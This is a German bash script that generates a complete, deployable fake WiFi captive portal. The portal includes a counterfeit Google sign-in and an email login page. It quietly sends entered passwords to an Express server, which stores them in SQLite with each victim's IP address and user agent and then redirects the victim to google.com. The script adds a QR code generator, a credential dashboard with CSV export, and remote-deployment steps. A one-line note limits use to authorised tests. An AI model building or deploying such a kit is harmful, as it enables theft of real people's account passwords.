#!/bin/bash
# Script zum Erstellen einer React-App für einen Fake WiFi Hotspot
# Für Unix/macOS/Linux mit Server-Komponente für Credential-Speicherung
# Port 6666 wird für den Server verwendet

set -e  # Stoppt das Skript bei Fehlern

echo "🚀 Erstelle Free-WiFi Phishing-Testumgebung mit Datenbank-Backend..."

# Erstelle Projektordner
mkdir -p free-wifi
cd free-wifi

# Erstelle React-App mit create-react-app
echo "📦 Erstelle React-App..."
npx create-react-app .

# Bereinige unnötige Dateien
echo "🧹 Bereinige Standard-Dateien..."
rm -f src/*.css src/*.svg src/App.test.js src/logo.svg src/reportWebVitals.js src/setupTests.js
rm -f public/favicon.ico public/logo*.png public/manifest.json public/robots.txt

# Erstelle index.html
echo "📄 Erstelle index.html..."
cat > public/index.html << 'EOL'
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#2C2E3B" />
    <meta name="description" content="WiFi Hotspot Login" />
    <title>WiFi - Anmeldung erforderlich</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
</head>
<body>
    <noscript>Sie müssen JavaScript aktivieren, um diese Anwendung zu nutzen.</noscript>
    <div id="root"></div>
</body>
</html>
EOL

# Erstelle App.js
echo "📄 Erstelle App.js..."
cat > src/App.js << 'EOL'
import React, { useState } from 'react';
import './App.css';

function App() {
  const [showLoginForm, setShowLoginForm] = useState(false);
  const [showGoogleForm, setShowGoogleForm] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [googleEmail, setGoogleEmail] = useState('');
  const [googlePassword, setGooglePassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleStandardLogin = () => {
    setShowLoginForm(true);
    setShowGoogleForm(false);
  };

  const handleGoogleLogin = () => {
    setShowGoogleForm(true);
    setShowLoginForm(false);
  };

  const sendData = async (data) => {
    try {
      // Verwende Port 6666 für Server-Endpunkt
      const url = 'http://localhost:6666/api/log';

      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      // Optional: Hier kann die Verarbeitung der Antwort erfolgen
    } catch (error) {
      console.error('Error:', error);
      // Fehler leise behandeln, um den Benutzer nicht zu alarmieren
    }
  };

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    await sendData({
      type: 'email',
      email,
      password
    });

    // Weiterleitung nach kurzer Verzögerung
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1000);
  };

  const handleGoogleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    await sendData({
      type: 'google',
      email: googleEmail,
      password: googlePassword
    });

    // Weiterleitung nach kurzer Verzögerung
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1000);
  };

  return (
    <div className="container">
      <div className="status-bar">
        <div className="wifi-name">Free_WiFi_Hotspot</div>
        <div className="signal-strength">
          <div className="signal-bar"></div>
          <div className="signal-bar"></div>
          <div className="signal-bar"></div>
          <div className="signal-bar inactive"></div>
          <div className="signal-bar inactive"></div>
        </div>
      </div>

      <div className="header">
        <div className="wifi-icon">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 6C8.62 6 5.5 7.12 3 9.09L12 21L21 9.09C18.5 7.12 15.38 6 12 6Z" fill="#2C2E3B" fillOpacity="0.7"/>
            <path d="M12 3C7.95 3 4.21 4.34 1.2 6.6L3 9.09C5.5 7.12 8.62 6 12 6C15.38 6 18.5 7.12 21 9.09L22.8 6.6C19.79 4.34 16.05 3 12 3Z" fill="#2C2E3B" fillOpacity="0.4"/>
          </svg>
        </div>
        <h1>WLAN-Anmeldung erforderlich</h1>
        <p>Melde dich an, um auf das Internet zuzugreifen.</p>
      </div>

      {!showLoginForm && !showGoogleForm && (
        <>
          <button onClick={handleGoogleLogin} className="google-btn">
            <svg className="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
              <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
              <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
              <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
              <path fill="none" d="M0 0h48v48H0z"/>
            </svg>
            <span className="google-text">Mit Google anmelden</span>
          </button>

          <div className="divider">
            <div className="divider-line"></div>
            <div className="divider-text">ODER</div>
            <div className="divider-line"></div>
          </div>

          <button onClick={handleStandardLogin} className="submit-btn">Mit E-Mail anmelden</button>
        </>
      )}

      {showLoginForm && (
        <form onSubmit={handleLoginSubmit} className="form">
          <div className="form-group">
            <label htmlFor="email">E-Mail</label>
            <input
              type="email"
              id="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="password">Passwort</label>
            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Wird angemeldet...' : 'Anmelden'}
          </button>
        </form>
      )}

      {showGoogleForm && (
        <form onSubmit={handleGoogleSubmit} className="form">
          <div className="form-group">
            <label htmlFor="google-email">Google-E-Mail</label>
            <input
              type="email"
              id="google-email"
              value={googleEmail}
              onChange={(e) => setGoogleEmail(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="google-password">Google-Passwort</label>
            <input
              type="password"
              id="google-password"
              value={googlePassword}
              onChange={(e) => setGooglePassword(e.target.value)}
              required
            />
          </div>
          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Wird angemeldet...' : 'Mit Google anmelden'}
          </button>
        </form>
      )}

      <div className="footer">
        <p>Durch die Anmeldung akzeptierst du die <a href="#">Nutzungsbedingungen</a> und <a href="#">Datenschutzrichtlinien</a>.</p>
      </div>
    </div>
  );
}

export default App;
EOL

# Erstelle App.css
echo "📄 Erstelle App.css..."
cat > src/App.css << 'EOL'
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Roboto', Arial, sans-serif;
}

body {
  background-color: #f1f1f1;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  color: #5f6368;
}

.container {
  background-color: #fff;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
  width: 100%;
  max-width: 450px;
  padding: 40px 30px;
  margin: 20px auto;
}

.header {
  text-align: center;
  margin-bottom: 30px;
}

.wifi-icon {
  font-size: 36px;
  color: #2C2E3B;
  margin-bottom: 15px;
}

h1 {
  font-size: 22px;
  color: #202124;
  margin-bottom: 10px;
  font-weight: normal;
}

p {
  font-size: 14px;
  margin-bottom: 20px;
  line-height: 1.5;
}

.google-btn {
  display: flex;
  align-items: center;
  justify-content: center;
  background-color: #fff;
  border: 1px solid #dadce0;
  border-radius: 4px;
  padding: 10px 15px;
  width: 100%;
  margin-bottom: 20px;
  cursor: pointer;
  transition: background-color 0.3s;
}

.google-btn:hover {
  background-color: #f7f7f7;
}

.google-icon {
  margin-right: 10px;
  width: 18px;
  height: 18px;
}

.google-text {
  font-size: 14px;
  color: #5f6368;
}

.form-group {
  margin-bottom: 15px;
}

label {
  display: block;
  font-size: 12px;
  margin-bottom: 5px;
  color: #5f6368;
}

input {
  width: 100%;
  padding: 12px 10px;
  border: 1px solid #dadce0;
  border-radius: 4px;
  font-size: 14px;
  color: #202124;
}

input:focus {
  outline: none;
  border-color: #2C2E3B;
}

.submit-btn {
  width: 100%;
  padding: 12px;
  background-color: #2C2E3B;
  color: white;
  border: none;
  border-radius: 4px;
  font-size: 14px;
  cursor: pointer;
  transition: background-color 0.3s;
  margin-top: 20px;
}

.submit-btn:hover {
  background-color: #1e2030;
}

.submit-btn:disabled {
  background-color: #9aa0a6;
  cursor: not-allowed;
}

.divider {
  display: flex;
  align-items: center;
  margin: 20px 0;
}

.divider-line {
  flex-grow: 1;
  height: 1px;
  background-color: #dadce0;
}

.divider-text {
  padding: 0 15px;
  color: #5f6368;
  font-size: 12px;
}

.footer {
  text-align: center;
  margin-top: 30px;
  font-size: 12px;
  color: #5f6368;
}

.footer a {
  color: #2C2E3B;
  text-decoration: none;
}

.status-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 15px;
  background-color: #f9f9f9;
  font-size: 12px;
  color: #5f6368;
  border-radius: 4px;
  margin-bottom: 20px;
}

.wifi-name {
  font-weight: bold;
}

.signal-strength {
  display: flex;
  align-items: center;
}

.signal-bar {
  height: 8px;
  width: 3px;
  background-color: #2C2E3B;
  margin-right: 2px;
  border-radius: 1px;
}

.inactive {
  background-color: #dadce0;
}

.form {
  width: 100%;
}
EOL

# Erstelle index.js
echo "📄 Erstelle index.js..."
cat > src/index.js << 'EOL'
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
EOL

# Erstelle index.css
echo "📄 Erstelle index.css..."
cat > src/index.css << 'EOL'
body {
  margin: 0;
  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Oxygen',
    'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
    sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  background-color: #f1f1f1;
}

code {
  font-family: source-code-pro, Menlo, Monaco, Consolas, 'Courier New',
    monospace;
}
EOL

# Erstelle package.json
echo "📄 Aktualisiere package.json..."
cat > package.json << 'EOL'
{
  "name": "free-wifi",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "@testing-library/jest-dom": "^5.16.5",
    "@testing-library/react": "^13.4.0",
    "@testing-library/user-event": "^13.5.0",
    "body-parser": "^1.20.2",
    "cors": "^2.8.5",
    "express": "^4.18.2",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-scripts": "5.0.1",
    "sqlite3": "^5.1.7",
    "web-vitals": "^2.1.4"
  },
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject",
    "deploy": "npm run build && echo 'Build abgeschlossen. Die Dateien befinden sich im Ordner \"build\"'",
    "server": "node server.js",
    "start-all": "npm run build && npm run server"
  },
  "eslintConfig": {
    "extends": [
      "react-app",
      "react-app/jest"
    ]
  },
  "browserslist": {
    "production": [
      ">0.2%",
      "not dead",
      "not op_mini all"
    ],
    "development": [
      "last 1 chrome version",
      "last 1 firefox version",
      "last 1 safari version"
    ]
  },
  "proxy": "http://localhost:6666"
}
EOL

# Erstelle ein Skript zum Generieren des QR-Codes
echo "📄 Erstelle QR-Code Generator Skript..."
cat > generate-qr.js << 'EOL'
const fs = require('fs');
const qrcode = require('qrcode');

// Die URL, für die ein QR-Code generiert werden soll
const url = process.argv[2] || 'http://localhost:3000';

// Generiere QR-Code
qrcode.toFile(
  'wifi-qr.png',
  url,
  {
    color: {
      dark: '#2C2E3B',
      light: '#FFFFFF'
    },
    width: 300,
    margin: 1
  },
  function(err) {
    if (err) {
      console.error('Fehler beim Erstellen des QR-Codes:', err);
      return;
    }
    console.log('✅ QR-Code wurde erstellt: wifi-qr.png');
    console.log(`Der QR-Code führt zu: ${url}`);
  }
);
EOL

# Erstelle Admin-Dashboard
echo "📄 Erstelle Admin-Dashboard..."
mkdir -p public/admin
cat > public/admin/index.html << 'EOL'
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Gesammelte Credentials</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }

        body {
            background-color: #f1f1f1;
            color: #333;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
        }

        h1 {
            color: #2C2E3B;
            font-size: 24px;
        }

        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        button {
            background-color: #2C2E3B;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        button:hover {
            background-color: #1e2030;
        }

        .export-btn {
            background-color: #34A853;
        }

        .export-btn:hover {
            background-color: #2d9249;
        }

        .delete-btn {
            background-color: #EA4335;
        }

        .delete-btn:hover {
            background-color: #d33426;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }

        th {
            background-color: #f9f9f9;
            font-weight: 500;
            font-size: 14px;
            color: #5f6368;
        }

        tr:hover {
            background-color: #f7f9fc;
        }

        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
        }

        .badge-google {
            background-color: #f1f3f4;
            color: #4285F4;
        }

        .badge-email {
            background-color: #e8f0fe;
            color: #1a73e8;
        }

        .status {
            margin: 15px 0;
            font-size: 14px;
            color: #5f6368;
        }

        .no-records {
            padding: 40px;
            text-align: center;
            color: #5f6368;
            font-style: italic;
        }

        .timestamp {
            font-size: 12px;
            color: #70757a;
        }

        footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
            padding-top: 10px;
            border-top: 1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Admin Dashboard - Gesammelte Credentials</h1>
            <p id="total-count" class="status">Lade Daten...</p>
        </header>

        <div class="toolbar">
            <button id="refresh-btn">Aktualisieren</button>
            <button id="export-btn" class="export-btn">Exportieren (CSV)</button>
            <button id="delete-all-btn" class="delete-btn">Alle löschen</button>
        </div>

        <div id="records-container">
            <table id="credentials-table">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Typ</th>
                        <th>E-Mail</th>
                        <th>Passwort</th>
                        <th>IP-Adresse</th>
                        <th>User-Agent</th>
                        <th>Zeitstempel</th>
                    </tr>
                </thead>
                <tbody id="table-body">
                    <!-- Tabellendaten werden hier eingefügt -->
                </tbody>
            </table>
            <div id="no-records" class="no-records" style="display: none;">
                Keine Datensätze gefunden.
            </div>
        </div>

        <footer>
            <p>Sicherheitsforschung - Nur zu Bildungszwecken und autorisierten Tests</p>
        </footer>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const tableBody = document.getElementById('table-body');
            const totalCount = document.getElementById('total-count');
            const noRecords = document.getElementById('no-records');
            const refreshBtn = document.getElementById('refresh-btn');
            const exportBtn = document.getElementById('export-btn');
            const deleteAllBtn = document.getElementById('delete-all-btn');

            // Daten laden
            function loadCredentials() {
                fetch('/api/admin/credentials')
                    .then(response => response.json())
                    .then(data => {
                        tableBody.innerHTML = '';

                        if (data.length === 0) {
                            noRecords.style.display = 'block';
                            document.getElementById('credentials-table').style.display = 'none';
                            totalCount.textContent = 'Keine Datensätze vorhanden';
                        } else {
                            noRecords.style.display = 'none';
                            document.getElementById('credentials-table').style.display = 'table';
                            totalCount.textContent = `${data.length} Datensätze gefunden`;

                            data.forEach(record => {
                                const row = document.createElement('tr');

                                const typeClass = record.type === 'google' ? 'badge-google' : 'badge-email';
                                const typeText = record.type === 'google' ? 'Google' : 'E-Mail';

                                row.innerHTML = `
                                    <td>${record.id}</td>
                                    <td><span class="badge ${typeClass}">${typeText}</span></td>
                                    <td>${escapeHtml(record.email)}</td>
                                    <td>${escapeHtml(record.password)}</td>
                                    <td>${escapeHtml(record.ipAddress || '-')}</td>
                                    <td title="${escapeHtml(record.userAgent || '')}">${escapeHtml(record.userAgent ? record.userAgent.substring(0, 30) + '...' : '-')}</td>
                                    <td class="timestamp">${new Date(record.timestamp).toLocaleString()}</td>
                                `;

                                tableBody.appendChild(row);
                            });
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        totalCount.textContent = 'Fehler beim Laden der Daten';
                    });
            }

            // Sicherheitsmaßnahme: HTML-Escaping
            function escapeHtml(text) {
                if (!text) return '';
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            }

            // CSV-Export
            function exportToCsv() {
                fetch('/api/admin/credentials')
                    .then(response => response.json())
                    .then(data => {
                        if (data.length === 0) {
                            alert('Keine Daten zum Exportieren vorhanden.');
                            return;
                        }

                        // CSV-Header
                        let csvContent = 'ID,Typ,E-Mail,Passwort,IP-Adresse,User-Agent,Zeitstempel\n';

                        // CSV-Daten
                        data.forEach(record => {
                            const row = [
                                record.id,
                                record.type,
                                record.email,
                                record.password,
                                record.ipAddress || '',
                                record.userAgent || '',
                                record.timestamp
                            ].map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',');

                            csvContent += row + '\n';
                        });

                        // Download-Link erstellen
                        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
                        const url = URL.createObjectURL(blob);
                        const link = document.createElement('a');
                        link.setAttribute('href', url);
                        link.setAttribute('download', `credentials_${new Date().toISOString().slice(0, 10)}.csv`);
                        link.style.visibility = 'hidden';
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Fehler beim Exportieren der Daten');
                    });
            }

            // Alle Datensätze löschen (erfordert entsprechenden Server-Endpunkt)
            function deleteAllRecords() {
                if (confirm('Bist du sicher, dass du alle Datensätze löschen möchtest? Diese Aktion kann nicht rückgängig gemacht werden.')) {
                    alert('Hinweis: Diese Funktion muss auf dem Server implementiert werden. Für diese Demo wird nur die Tabelle geleert.');
                    tableBody.innerHTML = '';
                    noRecords.style.display = 'block';
                    document.getElementById('credentials-table').style.display = 'none';
                    totalCount.textContent = 'Keine Datensätze vorhanden';
                }
            }

            // Event-Handler
            refreshBtn.addEventListener('click', loadCredentials);
            exportBtn.addEventListener('click', exportToCsv);
            deleteAllBtn.addEventListener('click', deleteAllRecords);

            // Initial Daten laden
            loadCredentials();
        });
    </script>
</body>
</html>
EOL

# Installiere Abhängigkeiten
echo "📦 Installiere Abhängigkeiten..."
npm install
npm install --save-dev qrcode
npm install express body-parser cors sqlite3

# Erstelle server.js
echo "📄 Erstelle server.js für Credential-Speicherung..."
cat > server.js << 'EOL'
// server.js - Backend-Server zum Empfangen und Speichern von Credentials
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

// Server-Konfiguration
const app = express();
const PORT = 6666;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'build')));

// Datenbank-Einrichtung
const dbDir = path.join(__dirname, 'data');
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir);
}

const db = new sqlite3.Database(path.join(dbDir, 'credentials.db'));

// Datenbank-Tabelle erstellen
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS credentials (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT NOT NULL,
      email TEXT NOT NULL,
      password TEXT NOT NULL,
      ipAddress TEXT,
      userAgent TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// Endpoint zum Empfangen von Credentials
app.post('/api/log', (req, res) => {
  const { type, email, password } = req.body;
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];

  if (!type || !email || !password) {
    return res.status(400).json({ error: 'Unvollständige Daten' });
  }

  const stmt = db.prepare(`
    INSERT INTO credentials (type, email, password, ipAddress, userAgent)
    VALUES (?, ?, ?, ?, ?)
  `);

  stmt.run(type, email, password, ipAddress, userAgent, (err) => {
    if (err) {
      console.error('Fehler beim Speichern der Credentials:', err);
      return res.status(500).json({ error: 'Datenbankfehler' });
    }

    console.log(`Neue ${type} Credentials gespeichert: ${email}`);
    res.status(200).json({ status: 'success' });
  });

  stmt.finalize();
});

// Endpoint zum Anzeigen aller gesammelten Credentials (nur für Administratoren)
app.get('/api/admin/credentials', (req, res) => {
  // Hier könnte eine Admin-Authentifizierung stattfinden

  db.all('SELECT * FROM credentials ORDER BY timestamp DESC', (err, rows) => {
    if (err) {
      console.error('Fehler beim Abrufen der Credentials:', err);
      return res.status(500).json({ error: 'Datenbankfehler' });
    }

    res.status(200).json(rows);
  });
});

// Serviere React-App für alle anderen Routen
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

// Server starten
app.listen(PORT, () => {
  console.log(`Server läuft auf Port ${PORT}`);
  console.log(`Phishing-Endpunkt: http://localhost:${PORT}/api/log`);
  console.log(`Admin-Übersicht: http://localhost:${PORT}/api/admin/credentials`);
});
EOL

# Kompiliere die App
echo "🔨 Baue die React-App..."
npm run build

# Erstelle den QR-Code für den Server
echo "🔄 Erstelle QR-Code für Server auf Port 6666..."
node generate-qr.js http://localhost:6666

echo ""
echo "✅ Free-WiFi Phishing-Testumgebung mit Datenbank-Backend wurde erfolgreich erstellt!"
echo ""
echo "Anleitung zum Starten der App mit Datenbank-Backend:"
echo "1. Navigiere in den Ordner 'free-wifi'"
echo "2. Führe 'npm run server' aus, um den Server auf Port 6666 zu starten"
echo "3. Die App ist dann unter http://localhost:6666 verfügbar"
echo "4. Credentials werden in der SQLite-Datenbank 'data/credentials.db' gespeichert"
echo "5. Admin-Übersicht der gesammelten Daten: http://localhost:6666/api/admin/credentials"
echo ""
echo "Für die Bereitstellung auf einem Remote-Server:"
echo "1. Führe 'npm run build' aus, um eine optimierte Version zu erstellen"
echo "2. Kopiere die server.js, package.json und den gesamten build-Ordner auf deinen Server"
echo "3. Führe 'npm install' und dann 'npm run server' auf dem Server aus"
echo ""
echo "Für eine produktionsreife Einrichtung:"
echo "1. Passe die IP- und Port-Einstellungen in server.js an"
echo "2. Erstelle einen neuen QR-Code mit deiner tatsächlichen Server-URL:"
echo "   node generate-qr.js https://deine-server-url.com:6666"
echo ""
echo "QR-Code wurde erstellt und im Projektordner gespeichert (wifi-qr.png)"
echo ""
echo "⚠️ WICHTIG: Diese Anwendung darf nur für autorisierte Sicherheitstests verwendet werden! ⚠️"

cd ..

chmod +x free-wifi/setup-free-wifi.sh

echo "Das Skript kann jetzt mit './free-wifi/setup-free-wifi.sh' ausgeführt werden."